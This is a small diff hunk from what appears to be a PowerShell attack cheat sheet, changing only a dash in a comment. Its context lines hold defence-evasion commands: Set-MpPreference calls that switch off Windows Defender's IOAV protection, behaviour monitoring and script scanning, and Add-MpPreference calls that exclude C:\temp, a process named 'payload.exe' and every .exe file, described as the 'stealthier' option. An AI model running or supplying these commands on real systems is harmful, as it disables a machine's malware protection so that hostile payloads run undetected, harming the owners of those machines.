@@ -31,7 +31,7 @@ Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableBehaviorMonitoring $true
 Set-MpPreference -DisableScriptScanning $true
 
-# Add exclusion path (stealthier — Defender stays on)
+# Add exclusion path (stealthier - Defender stays on)
 Add-MpPreference -ExclusionPath "C:\temp"
 Add-MpPreference -ExclusionProcess "payload.exe"
 Add-MpPreference -ExclusionExtension ".exe"
